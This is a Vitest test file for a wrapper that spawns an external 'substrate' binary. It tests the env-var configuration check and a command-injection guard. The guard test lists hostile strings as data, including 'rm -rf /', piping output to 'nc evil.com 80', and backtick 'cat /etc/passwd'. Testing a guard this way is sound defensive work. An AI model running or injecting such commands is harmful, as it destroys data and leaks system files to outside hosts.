/**
 * Tests for the Substrate runner wrapper.
 *
 * The runner spawns an external binary, so most behaviour is integration-
 * shaped (needs the actual `substrate.exe` on disk). We test the boundary
 * cases that don't require it:
 *   - isSubstrateConfigured reads the env var honestly
 *   - runSubstrateSimulate throws SubstrateNotConfiguredError when missing
 *   - Command-injection guard rejects shell metacharacters
 *
 * The actual binary spawn + output parsing is exercised manually via the
 * integration script (scripts/test-substrate-runner.ts when added) and in
 * the deployment smoke check on Hetzner.
 */

import { describe, it, expect, beforeEach } from "vitest";
import {
  isSubstrateConfigured,
  runSubstrateSimulate,
  SubstrateNotConfiguredError,
  SubstrateInvocationError,
  type SubstrateRecordingShape,
} from "@/lib/services/substrate-runner";

const minimalRecording: SubstrateRecordingShape = {
  meta: {
    id: "test-rec-1",
    started_at: new Date().toISOString(),
    ended_at: new Date().toISOString(),
    command: ["node", "app.js"],
    cwd: process.cwd(),
    env: {},
    substrate_version: "0.1.0",
    runtime: "node",
  },
  events: [],
};

beforeEach(() => {
  delete process.env.SUBSTRATE_BINARY_PATH;
});

describe("isSubstrateConfigured", () => {
  it("returns false when SUBSTRATE_BINARY_PATH is unset", () => {
    expect(isSubstrateConfigured()).toBe(false);
  });

  it("returns true when SUBSTRATE_BINARY_PATH is set", () => {
    process.env.SUBSTRATE_BINARY_PATH = "/usr/local/bin/substrate";
    expect(isSubstrateConfigured()).toBe(true);
  });

  it("returns false on empty string (treats as missing)", () => {
    process.env.SUBSTRATE_BINARY_PATH = "";
    expect(isSubstrateConfigured()).toBe(false);
  });
});

describe("runSubstrateSimulate — guards before spawn", () => {
  it("throws SubstrateNotConfiguredError when binary path is unset", async () => {
    await expect(
      runSubstrateSimulate({ recording: minimalRecording, command: "node app.js" }),
    ).rejects.toThrow(SubstrateNotConfiguredError);
  });

  it("rejects commands containing shell metacharacters (defense in depth)", async () => {
    process.env.SUBSTRATE_BINARY_PATH = "/usr/local/bin/substrate";
    // Each char tested individually to make a regression of just-one-char
    // immediately localizable. The guard collapses them into one regex.
    const dangerous = ["node app.js && rm -rf /", "node app.js; whoami", "node app.js | nc evil.com 80",
                       "node `cat /etc/passwd`", "node $PATH", "node app.js<input", "node app.js>output"];
    for (const cmd of dangerous) {
      await expect(
        runSubstrateSimulate({ recording: minimalRecording, command: cmd }),
      ).rejects.toThrow(SubstrateInvocationError);
    }
  });

  it("accepts plain commands without metacharacters", async () => {
    // Won't actually spawn (no real binary at this path) but should
    // pass the guards and reach the spawn step before failing.
    process.env.SUBSTRATE_BINARY_PATH = "/this/path/does/not/exist";
    const promise = runSubstrateSimulate({
      recording: minimalRecording,
      command: "node app.js",
    });
    // Will eventually reject with a spawn ENOENT, NOT with our guard.
    await expect(promise).rejects.toThrow(SubstrateInvocationError);
    const err = await promise.catch((e) => e);
    // ENOENT message rather than "shell metacharacters"
    expect((err as Error).message).not.toContain("metacharacters");
  });
});
